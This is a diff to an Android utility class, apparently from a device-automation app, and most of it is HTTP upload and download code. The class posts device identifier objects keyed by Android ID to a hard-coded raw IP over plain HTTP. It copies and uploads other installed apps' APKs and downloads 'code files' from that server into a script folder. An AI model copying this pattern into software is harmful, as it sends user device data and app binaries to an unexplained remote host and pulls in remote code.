@@ -3,14 +3,15 @@ package com.example.studyapp.task;
 import android.content.Context;
 import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
-import android.os.Build.VERSION;
-import android.os.Build.VERSION_CODES;
-import android.provider.Settings;
-import com.example.studyapp.MainActivity;
+import android.os.Environment;
+import android.util.Log;
 import com.google.gson.Gson;
 import com.google.gson.GsonBuilder;
+import java.io.BufferedOutputStream;
 import java.io.FileInputStream;
-import java.nio.file.Files;
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.util.concurrent.TimeUnit;
 import java.util.zip.ZipEntry;
 import java.util.zip.ZipOutputStream;
 import okhttp3.Call;
@@ -44,19 +45,26 @@ public class TaskUtil {
   private static volatile AfInfo afDevice;
 
   private static final String BASE_URL = "http://47.238.96.231:8112";
-  private static OkHttpClient okHttpClient = new OkHttpClient();
+  private static OkHttpClient okHttpClient = new OkHttpClient.Builder()
+      .connectTimeout(30, TimeUnit.SECONDS) // 连接超时
+      .writeTimeout(60, TimeUnit.SECONDS)   // 写入超时 (对上传很重要)
+      .readTimeout(30, TimeUnit.SECONDS)    // 读取超时
+      .build();
 
-  private static void postDeviceInfo(String androidId) {
+  public static void postDeviceInfo(String androidId) {
+    Log.i("TaskUtil", "postDeviceInfo called with androidId: " + androidId);
+
     if (okHttpClient == null) {
+      Log.e("TaskUtil", "HttpClient is not initialized");
       throw new IllegalStateException("HttpClient is not initialized");
     }
+
     if (BASE_URL == null || BASE_URL.isEmpty()) {
+      Log.e("TaskUtil", "BASE_URL is not initialized");
       throw new IllegalStateException("BASE_URL is not initialized");
     }
-    if (bigoDevice == null || afDevice == null || deviceInfo == null) {
-      throw new IllegalStateException("Device information is missing");
-    }
 
+    Log.d("TaskUtil", "Creating payload for the request...");
     Payload payload = new Payload();
     payload.bigoDeviceObject = bigoDevice;
     payload.afDeviceObject = afDevice;
@@ -65,115 +73,218 @@ public class TaskUtil {
     Gson gson = new GsonBuilder().serializeNulls().create();
     String jsonRequestBody = gson.toJson(payload);
 
+    Log.d("TaskUtil", "Request payload: " + jsonRequestBody);
+
     HttpUrl url = HttpUrl.parse(BASE_URL)
         .newBuilder()
         .addPathSegment("device_info_upload")
         .addQueryParameter("id", androidId)
         .build();
 
+    Log.d("TaskUtil", "Request URL: " + url.toString());
+
     RequestBody body = RequestBody.create(MediaType.get("application/json; charset=utf-8"), jsonRequestBody);
+    Log.d("TaskUtil", "Request body created");
 
     Request request = new Request.Builder()
         .url(url)
         .post(body)
         .build();
 
-    okHttpClient.newCall(request).enqueue(new Callback() {
-      @Override
-      public void onFailure(@NotNull Call call, @NotNull IOException e) {
-        System.err.println("Request failed: " + e.getMessage());
-        // Optional: Add retry logic
+    Log.i("TaskUtil", "Starting network call...");
+    try {
+      Response response = okHttpClient.newCall(request).execute();
+      try (ResponseBody responseBody = response.body()) {
+        if (!response.isSuccessful()) {
+          Log.e("TaskUtil", "Request failed with status: " + response.code() + ", message: " + response.message());
+          return;
+        }
+
+        if (responseBody != null) {
+          String responseText = responseBody.string();
+          Log.i("TaskUtil", "Request succeeded. Response: " + responseText);
+        } else {
+          Log.e("TaskUtil", "Response body is null");
+        }
+      } catch (IOException e) {
+        Log.e("TaskUtil", "Error while processing response: " + e.getMessage(), e);
+      }
+    } catch (IOException e) {
+      Log.e("TaskUtil", "Network call failed: " + e.getMessage(), e);
+    }
+  }
+
+  public static String getDeviceInfoSync(String androidId) {
+    Log.d("TaskUtil", "getDeviceInfoSync called with androidId: " + androidId);
+
+    validate(); // 检查 BASE_URL 和 okHttpClient 的合法性
+
+    HttpUrl url = HttpUrl.parse(BASE_URL + "/device_info_download")
+        .newBuilder()
+        .addQueryParameter("androidId", androidId)
+        .build();
+
+    Log.d("TaskUtil", "Constructed URL for device info download: " + url.toString());
+
+    Request request = new Request.Builder()
+        .url(url)
+        .get()
+        .build();
+
+    Log.d("TaskUtil", "Built HTTP request for device info download");
+
+    try (Response response = okHttpClient.newCall(request).execute()) {
+      // 检查响应是否成功
+      if (!response.isSuccessful()) {
+        String errorMessage = "Unexpected response: Code=" + response.code() +
+            ", Message=" + response.message() +
+            ", URL=" + url.toString();
+        Log.e("TaskUtil", errorMessage);
+        throw new IOException(errorMessage);
       }
 
-      @Override
-      public void onResponse(@NotNull Call call, @NotNull Response response) {
-        try (ResponseBody responseBody = response.body()) {
-          if (!response.isSuccessful()) {
-            System.err.println("Request failed with status: " + response.code() + ", message: " + response.message());
-            return;
-          }
-          if (responseBody != null) {
-            System.out.println(responseBody.string());
-          } else {
-            System.err.println("Response body is null");
-          }
-        } catch (Exception e) {
-          System.err.println("Error while processing response: " + e.getMessage());
-        }
+      ResponseBody responseBody = response.body();
+      if (responseBody != null) {
+        String responseString = responseBody.string();
+        Log.i("TaskUtil", "Received response: " + responseString);
+        return responseString;
+      } else {
+        String errorMessage = "Response body is null: URL=" + url.toString();
+        Log.e("TaskUtil", errorMessage);
+        throw new IOException(errorMessage);
       }
-    });
+    } catch (IOException e) {
+      String errorMessage = "Error during HTTP request. URL=" + url.toString() +
+          ", Android ID=" + androidId;
+      Log.e("TaskUtil", errorMessage, e);
+      e.printStackTrace();
+      return null; // 或考虑在上层抛出异常
+    }
   }
 
   public static void infoUpload(Context context, String androidId, String packAge) throws IOException {
+    Log.i("TaskUtil", "infoUpload called with androidId: " + androidId + ", package: " + packAge);
+
+    if (packAge == null || packAge.isEmpty()) {
+      Log.e("TaskUtil", "Package name is null or empty");
+      throw new IllegalArgumentException("Package name cannot be null or empty");
+    }
 
     if (context == null) {
-      throw new IllegalArgumentException("Context or Package name cannot be null or empty");
+      Log.e("TaskUtil", "Context is null");
+      throw new IllegalArgumentException("Context cannot be null");
     }
 
     if (androidId == null || androidId.isEmpty()) {
-      System.err.println("ANDROID_ID is null or empty");
+      Log.w("TaskUtil", "ANDROID_ID is null or empty");
       return;
     }
+
     PackageInfo packageInfo;
     try {
-      // 根据包名获取APK路径
+      Log.d("TaskUtil", "Fetching package info for package: " + packAge);
       packageInfo = context.getPackageManager().getPackageInfo(packAge, 0);
       if (packageInfo == null) {
-        throw new IllegalStateException("未找到包名对应的信息：" + packAge);
+        Log.e("TaskUtil", "Package info not found for package: " + packAge);
+        throw new IllegalStateException("Package info not found: " + packAge);
       }
     } catch (PackageManager.NameNotFoundException e) {
-      throw new RuntimeException("未找到包名对应的应用：" + packAge, e);
+      Log.e("TaskUtil", "Package not found: " + packAge, e);
+      throw new RuntimeException("Package not found: " + packAge, e);
     }
 
-    String apkSourceDir = packageInfo.applicationInfo.sourceDir; // APK路径
-    String outputZipPath = new File(
-        context.getExternalFilesDir(null),
-        androidId + "_" + packAge + ".zip"
-    ).getAbsolutePath(); // 压缩文件输出路径
+    String apkSourceDir = packageInfo.applicationInfo.sourceDir;
+    Log.d("TaskUtil", "APK source directory: " + apkSourceDir);
+
+    File externalDir = context.getExternalFilesDir(null);
+    if (externalDir == null) {
+      Log.e("TaskUtil", "External storage directory is unavailable");
+      throw new IOException("External storage directory is unavailable");
+    }
+
+    String outputZipPath = new File(externalDir, androidId + "_" + packAge + ".zip").getAbsolutePath();
+    Log.d("TaskUtil", "Output ZIP path: " + outputZipPath);
 
     File zipFile = new File(outputZipPath);
-    if (zipFile.exists() && !zipFile.delete()) {
-      System.err.println("旧的压缩文件无法删除：" + outputZipPath);
+    if (zipFile.exists() && !deleteFileSafely(zipFile)) {
+      Log.w("TaskUtil", "Failed to delete old zip file: " + outputZipPath);
       return;
     }
 
     File sourceApk = new File(apkSourceDir);
     File copiedApk = new File(context.getCacheDir(), packAge + "_temp.apk");
-    if (copiedApk.exists() && !copiedApk.delete()) {
-      System.err.println("旧的临时apk文件无法删除：" + copiedApk.getAbsolutePath());
+    if (copiedApk.exists() && !deleteFileSafely(copiedApk)) {
+      Log.w("TaskUtil", "Failed to delete old temp APK file: " + copiedApk.getAbsolutePath());
       return;
     }
-    Files.copy(sourceApk.toPath(), copiedApk.toPath());
+
+    copyFile(sourceApk, copiedApk);
 
     // 压缩APK文件
-    try (
-        FileInputStream fis = new FileInputStream(copiedApk);
-        FileOutputStream fos = new FileOutputStream(outputZipPath);
+    compressToZip(copiedApk, zipFile, apkSourceDir);
+
+    // 上传压缩文件
+    if (!zipFile.exists()) {
+      Log.w("TaskUtil", "Upload file does not exist: " + outputZipPath);
+      return;
+    }
+
+    uploadFile(zipFile);
+
+    // 清理临时文件
+    deleteFileSafely(copiedApk);
+    deleteFileSafely(zipFile);
+  }
+
+  private static boolean deleteFileSafely(File file) {
+    if (file.exists()) {
+      return file.delete();
+    }
+    return true;
+  }
+
+  private static final int BUFFER_SIZE = 1024 * 4;
+
+  private static void copyFile(File src, File dst) throws IOException {
+    Log.d("TaskUtil", "Copying APK file to temp location...");
+    try (FileInputStream inputStream = new FileInputStream(src);
+        FileOutputStream outputStream = new FileOutputStream(dst)) {
+      byte[] buffer = new byte[BUFFER_SIZE];
+      int length;
+      while ((length = inputStream.read(buffer)) > 0) {
+        outputStream.write(buffer, 0, length);
+      }
+      Log.i("TaskUtil", "APK file copied to temp location: " + dst.getAbsolutePath());
+    } catch (IOException e) {
+      Log.e("TaskUtil", "Error while copying APK file", e);
+      throw e;
+    }
+  }
+
+  private static void compressToZip(File src, File dst, String apkSourceDir) throws IOException {
+    Log.d("TaskUtil", "Starting to compress the APK file...");
+    try (FileInputStream fis = new FileInputStream(src);
+        FileOutputStream fos = new FileOutputStream(dst);
         ZipOutputStream zipOut = new ZipOutputStream(fos)) {
 
-      ZipEntry zipEntry = new ZipEntry(new File(apkSourceDir).getName());
-      zipOut.putNextEntry(zipEntry);
-      byte[] buffer = new byte[1024];
+      String entryName = new File(apkSourceDir).getName();
+      zipOut.putNextEntry(new ZipEntry(entryName));
+      byte[] buffer = new byte[BUFFER_SIZE];
       int bytesRead;
       while ((bytesRead = fis.read(buffer)) >= 0) {
         zipOut.write(buffer, 0, bytesRead);
       }
-      System.out.println("APK文件成功压缩至：" + outputZipPath);
+      zipOut.closeEntry();
+      Log.i("TaskUtil", "APK file successfully compressed to: " + dst.getAbsolutePath());
     } catch (IOException e) {
-      e.printStackTrace();
-      return;
+      Log.e("TaskUtil", "Error during APK file compression", e);
+      throw e;
     }
+  }
 
-    // 上传压缩文件
-    File fileToUpload = new File(outputZipPath);
-    if (!fileToUpload.exists()) {
-      System.out.println("上传文件不存在：" + outputZipPath);
-      return;
-    }
-
-    RequestBody fileBody = RequestBody.create(
-        MediaType.get("application/zip"), fileToUpload
-    );
+  public static void uploadFile(File fileToUpload) throws IOException {
+    Log.d("TaskUtil", "Preparing to upload file...");
+    RequestBody fileBody = RequestBody.create(MediaType.get("application/zip"), fileToUpload);
     MultipartBody requestBody = new MultipartBody.Builder()
         .setType(MultipartBody.FORM)
         .addFormDataPart("file", fileToUpload.getName(), fileBody)
@@ -184,26 +295,23 @@ public class TaskUtil {
         .post(requestBody)
         .build();
 
-    okHttpClient.newCall(request).enqueue(new Callback() {
-      @Override
-      public void onFailure(@NotNull Call call, @NotNull IOException e) {
-        e.printStackTrace();
-        System.out.println("上传失败: " + e.getMessage());
-      }
+    Log.i("TaskUtil", "Starting file upload to: " + BASE_URL + "/tar_info_upload");
 
-      @Override
-      public void onResponse(@NotNull Call call, @NotNull Response response) throws IOException {
-        try {
-          if (response.isSuccessful()) {
-            System.out.println("文件上传成功: " + response.body().string());
-          } else {
-            System.out.println("上传失败: " + response.message());
-          }
-        } finally {
-          response.close(); // 确保关闭 response 以避免资源泄漏
+    try (Response response = okHttpClient.newCall(request).execute()) {
+      ResponseBody body = response.body();
+      if (response.isSuccessful() && body != null) {
+        String responseBody = body.string();
+        Log.i("TaskUtil", "File upload successful. Response: " + responseBody);
+      } else {
+        Log.w("TaskUtil", "File upload failed. Response: " + (response.message() != null ? response.message() : "Unknown"));
+        if (body != null) {
+          body.close();
         }
       }
-    });
+    } catch (IOException e) {
+      Log.e("TaskUtil", "File upload failed", e);
+      throw e;
+    }
   }
 
   private static void validate() {
@@ -212,35 +320,6 @@ public class TaskUtil {
     }
     if (BASE_URL == null || BASE_URL.isEmpty()) {
       throw new IllegalStateException("BASE_URL is not initialized");
-    }
-  }
-
-  private static String getDeviceInfoSync(String androidId) {
-    validate(); // 检查 BASE_URL 和 okHttpClient 的合法性
-
-    HttpUrl url = HttpUrl.parse(BASE_URL + "/device_info_download")
-        .newBuilder()
-        .addQueryParameter("androidId", androidId)
-        .build();
-
-    Request request = new Request.Builder()
-        .url(url)
-        .get()
-        .build();
-
-    try (Response response = okHttpClient.newCall(request).execute()) {
-      if (!response.isSuccessful()) { // 检查响应状态
-        throw new IOException("Unexpected response: " + response);
-      }
-      ResponseBody body = response.body();
-      if (body != null) {
-        return body.string();
-      } else {
-        throw new IOException("Response body is null");
-      }
-    } catch (IOException e) {
-      e.printStackTrace();
-      return null; // 或者抛出上层处理
     }
   }
 
@@ -284,26 +363,65 @@ public class TaskUtil {
     });
   }
 
-  public static String execQueryTask(Context context) {
-    String androidId = Settings.Secure.getString(
-        context.getContentResolver(),
-        Settings.Secure.ANDROID_ID
-    );
+  public static File downloadCodeFile(String fileName) {
+    String baseUrl = BASE_URL + "/download_code_file";
+    String fullUrl = baseUrl + "?file_name=" + fileName;
+
+    Request request = new Request.Builder()
+        .url(fullUrl)
+        .get()
+        .build();
+
+    try (Response response = okHttpClient.newCall(request).execute()) {
+      if (response.isSuccessful() && response.body() != null) {
+        File scriptDir = new File(Environment.getExternalStorageDirectory(), "script");
+        if (!scriptDir.exists()) {
+          scriptDir.mkdirs(); // 创建 script 目录
+        }
+
+        File saveFile = new File(scriptDir, fileName);
+
+        try (InputStream is = response.body().byteStream();
+            OutputStream os = new BufferedOutputStream(new FileOutputStream(saveFile))) {
+
+          byte[] buffer = new byte[8192];
+          int bytesRead;
+          while ((bytesRead = is.read(buffer)) != -1) {
+            os.write(buffer, 0, bytesRead);
+          }
+
+          Log.i("TaskUtil", "File saved to: " + saveFile.getAbsolutePath());
+        }
+        return saveFile;
+      } else {
+        Log.w("TaskUtil", "Download failed: HTTP code " + response.code());
+        if (response.body() != null) {
+          Log.e("TaskUtil", "Response body: " + response.body().string());
+        }
+        return null;
+      }
+    } catch (Exception e) {
+      Log.e("TaskUtil", "Error downloading file", e);
+      return null;
+    }
+  }
+
+  public static String execQueryTask(String androidId) {
     return getDeviceInfoSync(androidId);
   }
 
-  public static void execSaveTask(Context context) {
+  public static void execSaveTask(Context context, String androidId) {
     if (context == null) {
       throw new IllegalArgumentException("Context or Package name cannot be null or empty");
     }
 
-    if (MainActivity.androidId == null || MainActivity.androidId.isEmpty()) {
+    if (androidId == null || androidId.isEmpty()) {
       System.err.println("ANDROID_ID is null or empty");
       return;
     }
 
     try {
-      postDeviceInfo(MainActivity.androidId);
+      postDeviceInfo(androidId);
     } catch (Exception e) {
       System.err.println("Error in execReloginTask: " + e.getMessage());
       e.printStackTrace();
